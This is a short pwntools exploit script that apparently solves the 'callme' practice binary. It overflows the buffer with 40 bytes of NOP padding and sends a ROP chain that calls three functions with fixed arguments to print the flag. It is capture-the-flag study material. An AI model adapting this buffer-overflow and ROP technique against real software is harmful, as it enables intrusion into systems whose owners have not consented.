from pwn import *

elf = context.binary = ELF("./callme",checksec=False)
p = process()

offset = 40

rop = ROP(elf)

params = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]

rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)

rop_chain = rop.chain()
info("rop chain here:%r", rop_chain)

payload = flat(
    asm('nop') * offset,
    rop_chain
)

p.sendlineafter('>', payload)
p.recvuntil("Thank you!\n")

flag = p.recv()
success(flag)